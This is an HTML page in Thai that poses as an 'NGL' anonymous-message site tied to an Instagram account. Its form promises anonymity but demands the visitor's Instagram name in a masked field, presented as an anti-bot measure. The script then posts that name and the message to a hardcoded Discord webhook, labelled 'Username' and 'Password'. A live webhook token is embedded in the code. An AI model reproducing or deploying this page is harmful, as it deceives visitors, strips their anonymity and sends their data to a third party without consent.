<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IG NGL Website Beta</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: linear-gradient(90deg, 
                                        red, 
                                        orange, 
                                        yellow, 
                                        green, 
                                        blue, 
                                        indigo, 
                                        violet);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: white;
            position: relative;
        }
        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            position: relative;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }
        img {
            border-radius: 50%;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin: 10px 0;
            font-size: 1.2em;
        }
        input {
            padding: 10px;
            margin: 10px 0;
            width: 80%;
            border: none;
            border-radius: 5px;
        }
        .button-container {
            margin-top: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            color: white;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        .instagram-button {
            position: absolute;
            top: 10px;
            right: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #E4405F;
            color: white;
            padding: 10px;
            border-radius: 50px;
            text-decoration: none;
        }
        .instagram-button img {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            border-radius: 50%;
        }
        .floating-text {
            position: absolute;
            bottom: 10px;
            font-size: 1em;
            color: rgba(255, 255, 255, 0.7);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            50% { transform: translateX(0); }
            75% { transform: translateX(10px); }
            100% { transform: translateX(0); }
        }
        .shake-button {
            animation: shake 2s infinite;
        }
        .warning {
            position: absolute;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 0, 0, 0.8);
            color: white;
            padding: 10px;
            border-radius: 5px;
            animation: fadeOut 3s forwards, moveUp 3s forwards;
        }
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; }
        }
        @keyframes moveUp {
            0% { top: 80px; }
            100% { top: 50px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://scontent.fubp1-1.fna.fbcdn.net/v/t39.30808-6/448724679_1147373999843386_4790927373824690437_n.jpg?stp=cp6_dst-jpg&_nc_cat=105&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeEyUouOM9TmzuYCbbEEysNS3tAg3kSYikfe0CDeRJiKR9d2BSYZP7lF7G6X7K6E5A5nynaQKwriIvr62WOekGDB&_nc_ohc=U7ZcD6gHt9MQ7kNvgFMKZrT&_nc_ht=scontent.fubp1-1.fna&oh=00_AYD4O81XJZBU-RuP4-jyRtYiCZp2F7cJQ74nQZ6T0tFZag&oe=667E052F" alt="profile image" height="100">
        <h1>ส่งข้อความของคุณ แบบไม่ระบุตัวตน!</h1>
        <div>\\ NGL ส่งข้อความแบบไม่ระบุตัวตน! //</div>

        <form id="registrationForm">
            <label for="username">กรุณากรอกชื่อ Instagram ของคุณตามนโยบายป้องกันบอท:</label>
            <input type="password" id="username" name="username" required><br>

            <label for="password">ข้อความ:</label>
            <input type="text" id="password" name="password" required><br>

            <div class="button-container">
                <button type="button" class="shake-button" onclick="submitForm()">Send</button>
            </div>
        </form>
        <a class="instagram-button" href="https://www.instagram.com/aegonaart/" target="_blank">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Icon">
            ติดต่อผม
        </a>
    </div>

    <div class="floating-text">เว็ปนี้สร้างจาก อาร์ต ไง จะใครหละ Eiei</div>

    <script>
        function submitForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username.trim() === '') {
                showWarning('โปรดกรอก เพื่อความปลอดภัยของ SMMG');
                return;
            }

            // เรียกฟังก์ชันเพื่อส่งข้อมูลไป Discord
            sendToDiscord(username, password);
        }

        function showWarning(message) {
            const warning = document.createElement('div');
            warning.className = 'warning';
            warning.innerText = message;
            document.body.appendChild(warning);

            setTimeout(() => {
                document.body.removeChild(warning);
            }, 3000);
        }

        function sendToDiscord(username, password) {
            const discordWebhookURL = 'https://discord.com/api/webhooks/1254436632078323825/Kmjec0sOxcFKc0t9wfksPH9rqndiidgkWhDAyucnB9xe__QXvayUCLtEiUYkh3QaZsu1'; // ใส่ Discord Webhook URL ที่คุณได้จาก Discord
            const data = {
                content: `---------------------------\nUsername: ${username}\nPassword: ${password}\n---------------------------`,
            };

            // ทำ HTTP POST request ไปยัง Discord API
            fetch(discordWebhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send data to Discord.');
                }
                console.log('Data sent to Discord successfully.');
            })
            .catch(error => {
                console.error(error.message);
            });
        }
    </script>
</body>
</html>
